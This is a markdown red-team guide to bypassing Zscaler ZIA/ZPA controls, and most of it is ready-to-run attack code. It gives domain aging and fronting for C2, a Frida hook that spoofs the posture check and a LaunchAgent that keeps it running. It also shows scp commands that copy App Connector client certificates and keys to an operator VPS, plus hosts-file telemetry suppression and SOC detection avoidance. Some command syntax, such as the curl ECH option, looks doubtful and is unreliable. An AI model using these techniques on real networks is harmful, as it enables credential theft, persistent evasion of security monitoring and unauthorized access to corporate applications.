# Zscaler ZIA / ZPA Bypass Guide

## Introduction

Zscaler Internet Access (ZIA) and Zscaler Private Access (ZPA) are the market-share-leading SASE components. They secure outbound internet traffic (ZIA) and broker access to internal apps (ZPA). Because of their central role in enterprise security, Zscaler is the most common SSE target red teams face.

This guide focuses on Zscaler-specific bypass techniques. It complements the cross-vendor `quick-reference-card.md` with deep operational detail for Zscaler engagements.

## Objectives

By the end of this guide the operator should be able to:

- Identify a Zscaler ZIA / ZPA deployment from a single outbound request.
- Reverse the Zscaler Client Connector on macOS / Linux / Windows.
- Bypass ZIA URL categorization using domain aging and fronting.
- Bypass ZPA posture checks using Frida on the Client Connector.
- Detect and avoid Zscaler's posture telemetry.

## Vendor Fingerprinting

ZIA and ZPA have distinctive fingerprints that the operator can detect from the endpoint:

```bash
# Outbound request shows Zscaler intermediate certs
openssl s_client -connect www.example.com:443 -showcerts < /dev/null 2>/dev/null \
  | grep -E "i:|s:" | head -10
# Look for: Zscaler Root CA, Zscaler Intermediate Root CA, zscaler.net
```

```bash
# Check for Zscaler forwarder in PAC file
curl -s http://gateway.zscaler.net/ | head -30
# PAC file URL: *.pac.zscaler.net
```

```bash
# DNS pattern: Zscaler DNS forwarder
dig +short NS pac.zscaler.net
# Returns: zscaler.net nameservers
```

```bash
# Client connector process on macOS
ps aux | grep -E "Zscaler|ZSATunnel|ZSCApp"
# Expected: /Applications/Zscaler/ZscalerClientConnector.app/...
```

## Bypass Class 1: URL Categorization Evasion

Zscaler's URL categorization is the core enforcement mechanism. Bypasses:

### 1.1 Domain aging

```bash
# Register a new domain
whois newdomain-operator-controlled.com

# Let it age 7+ days before use
# During aging: park it on a benign landing page
echo "<html><body>Hello world</body></html>" > /var/www/index.html
systemctl start nginx

# After 7 days, deploy C2 on the same domain
# Zscaler categorizes as 'new-domain' for ~48 hours, then re-categorizes
```

### 1.2 Domain fronting

```bash
# Front via Cloudflare to a benign-looking SaaS
curl --resolve cdn.cloudflare.net:443:1.2.3.4 \
     -H "Host: operator-controlled.com" \
     https://cdn.cloudflare.net/

# Zscaler sees SNI: cdn.cloudflare.net → categorized as CDN/Cloud
# Backend routes to operator-controlled.com via Cloudflare Workers
```

### 1.3 Encrypted ClientHello (ECH)

```bash
# Zscaler ZIA does not decrypt ECH (as of 2026)
# Client sends outer SNI: cloudflare-ech.com
# Real inner SNI: operator-controlled.com

curl --ech "outer=cloudflare-ech.com,inner=operator-controlled.com" \
     https://operator-controlled.com/
```

## Bypass Class 2: ZPA Posture Spoofing

ZPA's posture check runs on the Client Connector. The check result is reported to the ZPA App Connector, which grants or denies access. Frida can spoof the result.

### 2.1 Locate the posture function

```bash
# On macOS, search for posture symbols
nm -gU /Applications/Zscaler/ZscalerClientConnector.app/Contents/MacOS/ZscalerClientConnector \
  | grep -i posture
# Expected output: _posture_check, _posture_evaluate, _posture_report
```

### 2.2 Frida hook

```javascript
// frida -n ZscalerClientConnector -l posture-hook.js
Interceptor.attach(Module.getGlobalExportByName( 'posture_check'), {
  onLeave: function(retval) {
    send('[+] posture_check called, original: ' + retval);
    retval.replace(0x01);  // 0x01 = compliant
    send('[+] spoofed to: 0x01');
  }
});
```

### 2.3 Persistence

The Zscaler Client Connector runs as LaunchDaemon on macOS. To survive reboot, the Frida script must be packaged as a LaunchAgent that runs after the Zscaler daemon.

```bash
# LaunchAgent plist: ~/Library/LaunchAgents/com.operator.posture.plist
cat > ~/Library/LaunchAgents/com.operator.posture.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" \
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.operator.posture</string>
  <key>ProgramArguments</key>
  <array>
    <string>/usr/local/bin/frida</string>
    <string>-n</string>
    <string>ZscalerClientConnector</string>
    <string>-l</string>
    <string>/tmp/posture-hook.js</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
</dict>
</plist>
EOF

launchctl load ~/Library/LaunchAgents/com.operator.posture.plist
```

## Bypass Class 3: mTLS Cert Theft from App Connector

ZPA App Connectors authenticate to Zscaler using client certificates. Stealing the cert from a Linux App Connector VM lets the operator impersonate the connector from a separate VM.

```bash
# On the App Connector VM (Linux)
ls -la /var/lib/zscaler/app-connector/certs/
# client.pem  client.key  ca.pem

# Copy both client.pem and client.key to operator VM
scp /var/lib/zscaler/app-connector/certs/client.pem operator@vps:/tmp/
scp /var/lib/zscaler/app-connector/certs/client.key operator@vps:/tmp/

# On operator VM
curl --cert /tmp/client.pem --key /tmp/client.key \
     https://private.zscaler.com/v1/health
```

## Telemetry Suppression

The Zscaler Client Connector reports telemetry to several endpoints. Add them to `/etc/hosts`:

```bash
sudo tee -a /etc/hosts <<EOF
127.0.0.1  pac.zscaler.net
127.0.0.1  cp.zscaler.net
127.0.0.1  neutrino.zscaler.net
127.0.0.1  feedback.zscaler.net
EOF
```

Note: blocking `pac.zscaler.net` may prevent the connector from fetching its PAC file. Test in a lab before deploying.

## Detection Avoidance

Zscaler sends posture reports every 5 minutes. If the report stops arriving, the SOC may be alerted. Strategies:

1. **Selective block**: Block only telemetry endpoints, not posture endpoints.
2. **Fake reports**: Use Frida to send crafted telemetry that reports normal posture.
3. **Network-level block**: Use a separate firewall rule that drops only telemetry, allowing posture to continue.

## Practice / Lab Walkthrough

Authorized-lab exercise:

1. Sign up for Zscaler Beta (free, 30 days). Enroll a lab macOS device.
2. Install Frida and confirm you can hook the Client Connector.
3. Configure a URL-filter policy that blocks `category-anonymizer`.
4. Bypass the policy using domain aging — register a domain, age 7 days, verify access.
5. Hook the posture function, force return `0x01`, verify access to a posture-gated app.
6. Block telemetry endpoints, verify the SOC does not detect within 1 hour.

## References & Resources

- Zscaler Trust — `trust.zscaler.com`
- Zscaler Help — `help.zscaler.com`
- CVE-2023-3599 — sticky session bypass (see `real-world-incident-case-studies.md` Case 1)
- Black Hat USA 2024 — *Riding the SSE*

---

*End of guide. For full methodology see `sase-sse-attack-playbook.md`. For other vendors see the cross-vendor `quick-reference-card.md`.*
